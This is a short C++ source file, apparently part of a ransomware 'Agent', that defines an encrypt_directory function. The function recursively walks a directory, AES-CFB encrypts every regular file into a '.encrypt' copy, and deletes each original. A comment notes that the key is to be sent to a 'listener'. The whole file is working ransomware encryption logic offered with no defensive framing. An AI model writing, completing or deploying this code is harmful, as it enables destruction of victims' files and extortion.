#include "Agent.h"

#include <filesystem>
#include <array>
#include <Cryptopp/files.h>
#include <Cryptopp/aes.h>
#include <Cryptopp/modes.h>
#include <Cryptopp/osrng.h>

using namespace std::filesystem;
using namespace CryptoPP;

void Agent::encrypt_directory(const path& encryption_root_path)
{

	// Key should be saved and send to the listener 
	AutoSeededRandomPool rng{};
	std::array<CryptoPP::byte, CryptoPP::AES::DEFAULT_KEYLENGTH> key{};
	rng.GenerateBlock(key.data(), key.size());

	std::array<CryptoPP::byte, CryptoPP::AES::BLOCKSIZE> iv{};
	rng.GenerateBlock(iv.data(), iv.size());
	
	for(const directory_entry& entry : recursive_directory_iterator(encryption_root_path))
	{
		if (entry.is_regular_file())
		{
			{
				path final_path = entry.path().string() + ".encrypt";
				CFB_Mode<AES>::Encryption encryption(key.data(), key.size(), iv.data());
				FileSource fsEnc(entry.path().c_str(), true, new StreamTransformationFilter(encryption, new FileSink(final_path.c_str())));
			}

			std::filesystem::remove(entry.path());
		}
	}
}
